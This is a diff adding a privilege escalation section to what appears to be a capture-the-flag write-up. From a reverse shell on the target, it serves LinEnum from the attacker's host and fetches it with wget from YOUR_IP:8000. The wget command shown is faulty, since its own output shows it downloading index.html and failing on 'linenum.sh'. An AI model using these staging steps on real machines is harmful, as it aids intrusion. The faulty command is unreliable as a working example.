@@ -74,3 +74,31 @@ From here, we can go back one directory and read into _user.txt_
 ![image]({{0xtaylur.github.io}}/assets/user.png)
 
 ## Privilege Escalation
+
+Let's start off with using LinEnum to see if we can look into any interesting files that we can use to start our privilege escalation. On your host machine, change into your directory where you have _LinEnum_ stored. If you do not have LinEnum you can get it [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) by using the _wget_ command.
+
+On your host machine, start a SimpleHTTPServer on port 8000 by using this command.
+```markdown
+python -m SimpleHTTPServer
+```
+
+Change into the /tmp directory on your reverse shell, we can use the _wget_ command to put LinEnum.sh on the machine so we can run it.
+```markdown
+$ wget YOUR_IP:8000 LinEnum.sh
+--2020-06-17 15:29:50--  http://YOUR_IP:8000/
+Connecting to YOUR_IP:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 218 [text/html]
+Saving to: ‘index.html’
+
+     0K                                                       100% 30.3M=0s
+
+2020-06-17 15:29:50 (30.3 MB/s) - ‘index.html’ saved [218/218]
+
+--2020-06-17 15:29:50--  http://linenum.sh/
+Resolving linenum.sh (linenum.sh)... failed: Name or service not known.
+wget: unable to resolve host address ‘linenum.sh’
+FINISHED --2020-06-17 15:29:51--
+Total wall clock time: 0.7s
+Downloaded: 1 files, 218 in 0s (30.3 MB/s)
+```
